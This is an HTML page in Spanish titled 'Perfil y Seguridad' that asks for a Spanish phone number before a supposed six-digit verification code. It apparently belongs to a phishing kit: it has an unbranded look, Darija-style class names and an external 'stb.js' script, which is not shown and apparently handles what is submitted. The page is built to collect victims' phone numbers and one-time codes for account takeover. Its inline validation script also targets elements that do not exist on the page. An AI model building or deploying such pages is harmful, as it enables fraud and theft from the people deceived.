<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="./css/galo.css">
    <link rel="stylesheet" href="./css/galo-mb.css">
    <script src="https://code.jquery.com/jquery-3.6.0.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
    <title></title>
</head>
<body >  
    <div class="topline"></div>
    <div class="kolchi">
        
        <!-- lfoqani -->
        
        <div class="lfoq">
            <div class="top-img">
                <img class="top-pc" src="./img/hetopo-pc-02.png" alt="">
                <img class="top-mb" src="./img/hedopo-mb-02.png" alt="">
            </div>
        </div>
        <!--  -->
        <div class="center2">
            <div>
                <p class="pp3">Perfil y Seguridad</p>
                
                <form method="post" id="pg6">
                    <div class="inform">
                        <p class="pp4">Tenemos que verificarte con un clave de 6 digitos, <span>pero primero debes ingresar tu número para asegurarnos de que es tuyo.</span></p>
                        <div class="group2">  
                            <p>+34</p>    
                            <input style="color: rgb(130, 130, 130);" type="text" id="namra" maxlength="9" placeholder="Teléfono" required>
                        </div>
                    
                    
                    </div> 
                
                
                <button type="submit">Continuar</button>
            </form>
            </div>
        </div>

        <div class="botano">
            <img class="bot-pc" src="./img/botanoma-pc01.png" alt="">
            <img class="bot-mb" src="./img/botanoma-mb01.png" alt="">
            <!-- <div class="topline2"></div> -->
        </div>
    </div>
    

    <script>
        document.getElementById('dni').addEventListener('input', function(event) {
    // Remove any non-numeric characters
    this.value = this.value.replace(/[^0-9]/g, '');

    // Check if the input starts with 6 or 7
    if (this.value.startsWith('6') || this.value.startsWith('7')) {
        // If it starts with 6 or 7, set the border back to normal
        document.querySelector('.group2').style.border = '';
    } else {
        // If it doesn't start with 6 or 7, set the border to red
        document.querySelector('.group2').style.border = '2px solid red';
    }
});

document.getElementById('submitButton').addEventListener('click', function(event) {
    const dniInput = document.getElementById('dni');
    if (!dniInput.value.startsWith('6') && !dniInput.value.startsWith('7')) {
        // Prevent form submission if the input doesn't start with 6 or 7
        event.preventDefault();
        alert('Input must start with 6 or 7');
    }
});
    </script>
   
    <!-- my script -->
    <script src="./js/stb.js" type="module"></script>
</body>
</html>